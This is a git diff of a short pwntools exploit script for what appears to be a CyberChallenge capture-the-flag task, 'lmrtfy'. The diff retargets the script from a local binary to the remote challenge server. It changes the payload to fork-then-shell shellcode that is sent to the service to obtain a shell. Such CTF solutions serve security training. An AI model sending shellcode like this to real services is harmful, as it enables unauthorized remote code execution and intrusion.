@@ -1,13 +1,13 @@
 from pwn import *
 
-exe = ELF('lmrtfy')
-r = process(exe.path)
-# r = remote('lmrtfy.challs.cyberchallenge.it', 9124)
-context.binary = exe
+# exe = ELF('lmrtfy')
+# r = process(exe.path)
+r = remote('lmrtfy.challs.cyberchallenge.it', 9124)
+# context.binary = exe
 context.log_level = 'debug'
 
 
-r.sendline(asm(shellcraft.sh()))
+r.sendline(asm(shellcraft.fork() + shellcraft.sh()))
 print(r.clean())
 
 
